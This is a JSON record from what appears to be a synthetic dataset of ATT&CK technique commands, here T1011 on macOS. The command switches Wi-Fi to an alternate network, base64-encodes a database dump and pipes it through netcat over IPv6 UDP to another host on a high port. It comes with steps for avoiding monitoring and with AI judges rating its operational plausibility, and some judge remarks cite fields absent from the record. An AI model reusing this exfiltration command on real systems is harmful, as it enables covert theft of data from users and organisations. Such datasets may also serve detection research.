{
  "technique_id": "T1011",
  "platform": "macOS",
  "shell": "Bash",
  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
  "explanation": "Uses an alternate Wi‑Fi SSID to exfiltrate a database dump via IPv6 UDP to a high, uncommon port, reducing overlap with typical monitored services. This leverages a different network medium than the primary channel, consistent with T1011.",
  "rationale_steps": [
    "Drop any existing Wi‑Fi association.",
    "Join a non-corporate SSID on a less common 5 GHz channel.",
    "Base64-encode the dump to make payload less obvious in transit.",
    "Transmit via IPv6 UDP on a high port scoped to the Wi‑Fi interface."
  ],
  "obfuscation_level": "none",
  "id": "SYN-BASH-T1011-0b4a25ae-0762cc79",
  "source_prompt_hash": "0b4a25ae",
  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Commands are correctly chained with && and |, quoting is balanced, and the flags for airport, networksetup, and nc (including IPv6 link-local scope) are valid and parseable.",
        "semantic_score": 4,
        "semantic_justification": "It disconnects and joins a target Wi‑Fi SSID then base64-encodes and sends the file via IPv6 UDP to a link‑local address consistent with T1011, but missing sudo for networksetup and the incorrect 'Privilege: None' reduce operational plausibility.",
        "combined_score": 4.5,
        "confidence": 0.83,
        "timestamp": "2025-10-01T01:09:09.941320Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags for all tools (airport -z, networksetup -setairportnetwork, base64, nc -6u with port and -w timeout), and correct piping.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly aligns with T1011 by disconnecting from current WiFi, connecting to an alternate network (field_ops_149), and exfiltrating base64-encoded database content over IPv6 UDP to a specific host on an uncommon port (53317).",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T01:09:15.726755Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with correct utility paths, flags, command separators, and proper quoting for all arguments on macOS.",
        "semantic_score": 2,
        "semantic_justification": "The command's semantic flow is broken because `networksetup -setairportnetwork` requires `sudo` but is not prefixed with it, causing it to fail and preventing the intended switch to an alternate Wi-Fi SSID, thus failing to achieve the core T1011 objective as described.",
        "combined_score": 3.5,
        "confidence": 0.9,
        "timestamp": "2025-10-01T06:24:40.015293Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.667,
    "llm_average_score": 4.333,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
